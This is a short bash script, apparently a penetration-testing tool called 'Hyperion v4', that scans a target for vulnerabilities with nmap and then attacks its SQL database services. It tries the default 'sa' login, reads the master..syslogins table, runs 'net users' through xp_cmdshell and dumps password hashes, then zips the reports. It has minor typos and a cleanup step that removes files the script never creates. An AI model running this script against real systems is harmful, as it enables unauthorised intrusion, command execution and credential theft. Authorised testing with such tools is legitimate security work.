#!/bin/bash
# Hyperion v4 Script  performs database server tests using SQL cripts and nmap
# target
r=$1

# nmap vuln
sudo nmap -vv $1 --script vuln --script vulners -p - -oX unmap.xml
xsltproc unmap.xml -o unmapdb.html
# nmap
sudo nmap -p - --script ms-sql-info --script mysql-databases --script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query="SELECT * FROM master..syslogins" --script ms-sql-empty-password --script ms-sql-hasdbaccess --script ms-sql-tables --script-args mssql.usernam=sa --script ms-sql-xp-cmdshell --script-args mssql.username=sa --script ms-sql-xp-cmdshell --script-args=ms-sql-xp-cmdshell.cmd='net users',mssql.username=sa --script ms-sql-dump-hashes --script-args mssql.username=sa $1 -oX us.xml
xsltproc us.xml -o nmapdb.html

# zip
zip database.zip unmapdb.html nmapdb.html

# clean up
rm unmap.xml unmap.html us.xml us.html
